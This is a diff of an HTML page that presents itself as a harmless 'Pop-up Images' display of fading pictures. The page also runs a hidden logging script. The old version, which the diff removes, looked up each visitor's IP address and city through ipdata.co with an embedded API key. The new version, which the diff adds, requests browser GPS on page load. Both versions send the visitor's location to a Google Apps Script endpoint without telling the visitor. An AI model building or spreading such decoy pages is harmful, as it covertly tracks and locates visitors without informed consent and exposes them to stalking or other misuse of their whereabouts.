@@ -2,23 +2,21 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Pop-up Images</title>
+<title>Pop-up Images with Location</title>
 <style>
   body {
     margin: 0;
     background: #000;
     overflow: hidden;
-    position: relative;
     height: 100vh;
+    position: relative;
   }
-
   #image-container img {
     position: absolute;
     border-radius: 8px;
     opacity: 0;
     animation: fadeIn 0.5s forwards;
   }
-
   @keyframes fadeIn {
     to { opacity: 1; }
   }
@@ -43,16 +41,15 @@ const images = [
 ];
 
 // Preload images
-const preloaded = [];
-images.forEach(url => {
+const preloaded = images.map(url => {
   const img = new Image();
   img.src = url;
-  preloaded.push(img);
+  return img;
 });
 
 const container = document.getElementById("image-container");
 
-/************** POP MULTIPLE IMAGES **************/
+/************** POP IMAGES **************/
 function popImages(count = 5) {
   for (let i = 0; i < count; i++) {
     const img = document.createElement("img");
@@ -73,58 +70,36 @@ function popImages(count = 5) {
     setTimeout(() => img.remove(), 3000);
   }
 }
+
 setInterval(() => popImages(5), 1000);
 
-/************** VISITOR LOGGING **************/
-const IPDATA_KEY = "66ff8183ca16012885e156efee7fa9544853ee96576dc8a38ba406d1";
+/************** VISITOR LOGGING WITH GPS **************/
 const SHEET_WEBAPP_URL = "https://script.google.com/macros/s/AKfycbzl4A2uvwqWB-4UZklpK2YyoKZs4Ps-id0UYPhXC-4yvxcwElRkCumH8zga3qhlGlKZ5w/exec";
 
-async function logVisitor() {
-  try {
-    // IP-based
-    try {
-      const resp = await fetch(`https://api.ipdata.co?api-key=${IPDATA_KEY}`);
-      const data = await resp.json();
-
-      const paramsIP = new URLSearchParams({
-        ip: data.ip || 'UNKNOWN',
-        city: data.city || '',
-        region: data.region || '',
-        country: data.country_name || '',
-        latitude: data.latitude || '',
-        longitude: data.longitude || '',
-        type: "IP-based",
-        raw: data.message ? '' : JSON.stringify(data)
-      });
-
-      fetch(`${SHEET_WEBAPP_URL}?${paramsIP.toString()}`, { method: 'GET', mode: 'no-cors' });
-    } catch (err) {
-      // fallback if IPData fails
-      fetch(`${SHEET_WEBAPP_URL}?ip=UNKNOWN&type=IP-FAIL&raw=${err}`, { method: 'GET', mode: 'no-cors' });
-    }
-
-    // Browser GPS (if allowed)
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(pos => {
+function logVisitorGPS() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
-        const paramsGeo = new URLSearchParams({
-          ip: 'UNKNOWN',
-          city: '', region: '', country: '',
+
+        const params = new URLSearchParams({
           latitude: lat,
           longitude: lon,
           type: "Browser GPS",
           raw: ''
         });
-        fetch(`${SHEET_WEBAPP_URL}?${paramsGeo.toString()}`, { method: 'GET', mode: 'no-cors' });
-      });
-    }
-  } catch(err) {
-    console.error("Logging error:", err);
+
+        fetch(`${SHEET_WEBAPP_URL}?${params.toString()}`, { method: 'GET', mode: 'no-cors' });
+      },
+      err => {
+        console.warn("GPS denied or failed:", err);
+      }
+    );
   }
 }
 
-document.addEventListener('DOMContentLoaded', logVisitor);
+document.addEventListener('DOMContentLoaded', logVisitorGPS);
 </script>
 </body>
 </html>
